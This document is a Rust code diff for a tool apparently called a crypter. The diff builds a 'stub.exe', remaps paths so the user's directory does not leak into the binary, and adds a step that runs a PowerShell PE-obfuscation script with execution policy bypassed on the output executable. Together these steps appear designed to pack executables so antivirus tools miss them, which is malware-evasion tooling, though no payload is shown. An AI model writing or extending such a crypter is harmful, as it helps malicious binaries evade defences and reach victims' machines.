@@ -148,7 +148,7 @@ impl Crypter {
 fn build_stub(stub_dir: &Path) -> Result<PathBuf, String> {
     // Dynamically retrieve the current user profile directory
     let user_profile = std::env::var("USERPROFILE").map_err(|_| "USERPROFILE environment variable not set".to_string())?;
-    // Construct the remap rule: original path -> neutral path
+    // Remap build paths so absolute user paths don't leak into the binary
     let remap = format!("--remap-path-prefix={}=/build", user_profile);
 
     let status = Command::new("cargo")
@@ -157,11 +157,53 @@ fn build_stub(stub_dir: &Path) -> Result<PathBuf, String> {
         .current_dir(stub_dir)
         .status()
         .map_err(|e| format!("spawn cargo: {}", e))?;
+
     if !status.success() {
         return Err("stub build failed".to_string());
     }
-    pkg::log_info(&format!("Stub built successfully."));
-    Ok(stub_dir.join("target/release/stub.exe"))
+
+    // target/release/stub.exe (relative to the stub crate)
+    let stub_exe = stub_dir.join("target").join("release").join("stub.exe");
+    if !stub_exe.exists() {
+        return Err(format!("built stub not found: {}", stub_exe.display()));
+    }
+
+    pkg::log_info("Stub built successfully.");
+    Ok(stub_exe)
+}
+
+fn obfuscate_output(output_exe: &Path, stub_dir: &Path) -> Result<(), String> {
+    let root = stub_dir.parent().and_then(|p| p.parent()).ok_or_else(|| format!("cannot resolve grandparent of: {}", stub_dir.display()))?;
+    let script = root.join("scripts").join("obfuscate_pe.ps1");
+
+    if !script.exists() {
+        return Err(format!("obfuscation script not found: {}", script.display()));
+    }
+
+    if !output_exe.exists() {
+        return Err(format!("output exe not found: {}", output_exe.display()));
+    }
+
+    let output = Command::new("powershell")
+        .args([
+            "-NoProfile",
+            "-ExecutionPolicy", "Bypass",
+            "-File", script.to_str().ok_or("non-UTF8 script path")?,
+            "-Path", output_exe.to_str().ok_or("non-UTF8 exe path")?,
+        ])
+        .output()
+        .map_err(|e| format!("spawn powershell: {e}"))?;
+
+    if !output.status.success() {
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        return Err(format!("PE obfuscation failed: {stderr}"));
+    }
+    for line in String::from_utf8_lossy(&output.stdout).lines() {
+        pkg::log_info(line);
+    }
+
+    pkg::log_info("PE obfuscation applied to output binary.");
+    Ok(())
 }
 
 fn run(crypter: &mut Crypter, stub_dir: &Path) -> Result<(), String> {
@@ -171,7 +213,10 @@ fn run(crypter: &mut Crypter, stub_dir: &Path) -> Result<(), String> {
     crypter.generate_config(stub_dir)?;
 
     let built = build_stub(stub_dir)?;
+
     std::fs::copy(&built, &crypter.output).map_err(|e| format!("copy output failed: {}", e))?;
+    pkg::log_info(&format!("Stub copied to {}", crypter.output.display()));
+    obfuscate_output(&crypter.output, stub_dir)?;
     crypter.cleanup(stub_dir)?;
     Ok(())
 }
